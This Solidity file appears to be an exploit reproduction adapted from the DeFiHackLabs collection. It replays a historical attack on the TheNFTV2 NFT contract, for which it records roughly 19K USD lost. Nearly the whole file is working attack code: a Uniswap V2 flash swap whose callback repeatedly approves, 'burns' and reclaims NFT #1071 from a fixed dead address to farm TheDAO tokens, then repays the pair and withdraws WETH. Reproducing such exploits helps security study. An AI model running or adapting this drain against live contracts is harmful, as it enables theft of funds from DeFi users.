// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../interface.sol";

// @KeyInfo - Total Lost : ~19K USD$
// Attacker - https://etherscan.io/address/0x2F746bC70f72aAF3340B8BbFd254fd91a3996218
// Attack contract - https://etherscan.io/address/0x85301f7b943fd132c8dbc33f8fd9d77109a84f28
// Attack Tx : https://etherscan.io/tx/0xd5b4d68432cbbd912130bbb5b93399031ddbb400d8f723c78050574de7533106

// @Analysis - https://x.com/MetaTrustAlert/status/1728616715825848377?s=20
//
// Cheatcode-free reproduction for the in-browser EVM Playground. The original
// DeFiHackLabs test vm.prank()s the current NFT holder ("hacker", which is
// itself the historic on-chain attack contract address, already holding NFT
// #1071 at the frozen fork block) to move the NFT into the test contract with
// a single transferFrom() -- a Foundry-only impersonation with no equivalent
// inside the plain replay engine. It is replicated as an unrecorded
// `setup.steps` `rawCall` with `caller: hacker` instead (see the .mjs config).
// Everything else -- the Uniswap V2 flash swap and the repeated burn/reclaim
// drain inside its callback -- needs no cheatcodes and runs unchanged.
contract TheNFTV2 {
    IERC721 THENFTV2 = IERC721(0x79a7D3559D73EA032120A69E59223d4375DEb595);
    IERC20 TheDAO = IERC20(0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair uniswap = IUniswapV2Pair(0xE1eCaDb5FEC254c2c893C230b935Db30b8FfF0db);
    uint256 constant nftId = 1071;
    address deadaddress = 0x000000000000000000000000000000000074eda0;

    // Recorded entrypoint. By the time this runs, `setup.steps` has already
    // handed NFT #1071 from the frozen state's holder into this contract.
    function test() public {
        // Flash-swap 1,906,331,836,125,411,716 wei of WETH out of the TheDAO/WETH
        // pair; the pair calls back into uniswapV2Call() below before checking
        // the invariant, which must be repaid from TheDAO before it returns.
        uniswap.swap(0, 1_906_331_836_125_411_716, address(this), new bytes(1));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (uint256 thedaoReserve, uint256 wethReserve,) = uniswap.getReserves();
        uint256 amountOut = amount1;
        uint256 amountIn = getAmountIn(amountOut, thedaoReserve, wethReserve);

        // The core bug: THENFTV2.burn() only moves the token to a fixed dead
        // address instead of actually destroying it, and transferFrom() out of
        // that dead address is never blocked -- so the same NFT #1071 can be
        // approved, "burned", and reclaimed from the dead address in an
        // unbounded loop. Each reclaim mints/credits enough TheDAO to this
        // contract to eventually cover the flash-swap repayment.
        do {
            THENFTV2.approve(address(this), nftId);
            THENFTV2.burn(nftId);
            THENFTV2.transferFrom(deadaddress, address(this), nftId);
        } while (TheDAO.balanceOf(address(this)) < amountIn);

        TheDAO.transfer(address(uniswap), TheDAO.balanceOf(address(this)));
        WETH.withdraw(WETH.balanceOf(address(this)));
    }

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256 amountIn) {
        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        uint256 numerator = reserveIn * amountOut * (1000);
        uint256 denominator = (reserveOut - amountOut) * (997);
        amountIn = (numerator / denominator) + (1);
    }

    receive() external payable {}
}
